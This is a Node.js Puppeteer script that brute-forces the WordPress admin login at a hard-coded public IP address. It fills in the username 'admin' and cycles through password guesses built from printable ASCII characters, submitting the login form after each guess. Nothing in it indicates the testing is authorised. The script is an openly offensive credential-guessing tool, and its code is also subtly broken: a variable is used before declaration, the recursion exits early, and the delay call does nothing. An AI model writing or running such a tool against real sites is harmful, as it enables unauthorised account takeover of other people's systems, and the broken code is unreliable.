var arr = [];
var index = 0;
const puppeteer = require("puppeteer-core");
let document

//Start the program by launching the browser and trying combinations
async function start(){
  const browser = await puppeteer.launch({
      headless: false,
      executablePath:
        "/usr/bin/google-chrome",
    });
     document = await browser.newPage();
    await document.goto("http://35.180.242.197/wp-admin");
    await document.$eval("input[name=log]", (el) => (el.value = "admin"));
    await enumerate(utfString,4,document);
}
//Loop chars
async function enumerate(str, n) {
  for(var i=0;i<n;i++) {
    setTimeout(()=>{},1000)
    await loop(str,"",i+1);
  }
}
//Recursive function to loop all the chars
async function loop(istr,curstr,counter) {
  counter--;
  var test = curstr + istr.charAt(i);
  console.log(test)
  for(var i=0; i<istr.length; i++) {
    var str = curstr + istr.charAt(i);
//Don't go too fast or else you will try to select something that didn't load !!
    if(counter>0) {
        await document.type('#user_pass',str);
        await document.waitForSelector("#wp-submit");
        await document.click("#wp-submit");      
        return await loop(istr,str,counter);
    }
    else {
        console.log(str);
        arr[index++] = str;
    }
  }
}

//Loop chars aside
let utfString = "";
for(let i=33; i <= 126; i++){
    utfString += String.fromCharCode(i);
}

//Entry point
(async () => {
  await start();
})();
